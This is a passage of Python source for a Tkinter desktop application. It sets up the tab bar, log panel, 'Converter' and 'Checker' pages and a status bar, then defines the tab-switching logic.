                tabbar, text=name,
                bg=BG, fg=TEXT_DIM,
                activebackground=CARD, activeforeground=WHITE,
                relief="flat", cursor="hand2",
                font=("segoe ui", 9, "bold"),
                padx=20, pady=10, bd=0,
                command=lambda n=name: self._switch(n)
            )
            btn.pack(side="left")
            self._tab_btns[name] = btn

        # Active tab indicator line
        self._tab_line = tk.Frame(self, bg=RED, height=2)
        self._tab_line.place(x=0, y=0)  # will be positioned by _switch

        # ── Content area + log
        content_area = tk.Frame(self, bg=BG)
        content_area.pack(fill="both", expand=True)

        # Log panel on the right
        log_panel = LogPanel(content_area)
        log_panel.pack(side="right", fill="y", padx=(2, 0))
        log_panel.config(width=340)
        self.log = log_panel

        # Page container
        self._container = tk.Frame(content_area, bg=CARD)
        self._container.pack(side="left", fill="both", expand=True)

        # Build pages
        self._tab_pages["Converter"] = ConverterTab(self._container, self.log)
        self._tab_pages["Checker"]   = CheckerTab(self._container, self.log)

        # ── Status bar
        statusbar = tk.Frame(self, bg=BG3, height=24)
        statusbar.pack(fill="x", side="bottom")
        tk.Label(statusbar, text="●  Educational purposes only",
                 bg=BG3, fg=RED, font=("segoe ui", 7),
                 pady=4, padx=10).pack(side="left")
        tk.Label(statusbar, text="by Matheesha Pathirana",
                 bg=BG3, fg=MUTED, font=("segoe ui", 7),
                 pady=4, padx=10).pack(side="right")

        self._switch("Checker")
        self.log.log("Application started.", "info")

    def _switch(self, name):
        for page in self._tab_pages.values():
            page.pack_forget()
        self._tab_pages[name].pack(fill="both", expand=True)

        for n, btn in self._tab_btns.items():
            if n == name:
                btn.config(fg=WHITE, bg=CARD)
            else:
                btn.config(fg=TEXT_DIM, bg=BG)


if __name__ == "__main__":
    app = App()
    app.mainloop()
